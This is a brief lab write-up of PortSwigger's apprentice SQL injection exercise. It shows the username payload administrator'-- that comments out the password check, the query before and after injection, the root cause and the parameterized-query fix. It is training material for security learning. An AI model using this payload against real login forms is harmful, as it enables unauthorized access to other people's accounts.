# login bypass

- **Source:** [PortSwigger](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
- **Level:** Apprentice
- **Vulnerability class:** SQL injection
- **Date:** 2026-11-23

## Goal
Perform a SQL injection attack that logs in to the application as the administrator user.

## Solution
In the login form, I entered this in the username field:
administrator'--

The password field just needs any value so the form can be submitted.

The login query probably looks like this:
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = '1234'
```

After the payload:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = '1234'
```

`'` closes the username string, and `--` turns the password check into a comment. The query only checks the username, so I was logged in as administrator without knowing the password.

## Root cause
Username input is put directly into the SQL query instead of using a parameterized query.

## Fix
Use parameterized queries.

## What I learned
How to bypass a login by using `--` to remove the password check from the query.